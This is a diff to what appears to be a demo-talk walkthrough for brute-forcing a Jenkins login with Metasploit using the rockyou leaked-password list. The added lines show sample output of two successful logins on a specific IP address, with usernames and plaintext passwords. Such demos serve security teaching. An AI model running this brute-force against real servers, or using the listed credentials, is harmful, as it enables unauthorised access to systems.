@@ -35,6 +35,7 @@ cd /root/demotalk/jenkinsBrute/
 
 ## Prepare Passwordlist
 Let's use the end of rockyoulist as that contains the sophisticated passwords
+It contains 14344392 leaked passwords
 
 ```bash
 cd /root/demotalk/jenkinsBrute/
@@ -70,4 +71,9 @@ set USER_FILE /root/demotalk/jenkinsBrute/userlist.txt
 set PASS_FILE /root/demotalk/jenkinsBrute/passwordlist.txt
 set LOGIN_URL j_spring_security_check
 ```
+There will be two successful attempts
 
+```bash
+[+] 34.159.77.191:8080 - Login Successful: Robert.Bartsch:!@#$%1234pacr1234!@#$%
+[+] 34.159.77.191:8080 - Login Successful: Jeffrey_van_d_Linden:!@#$%67890QAZwsxh
+```
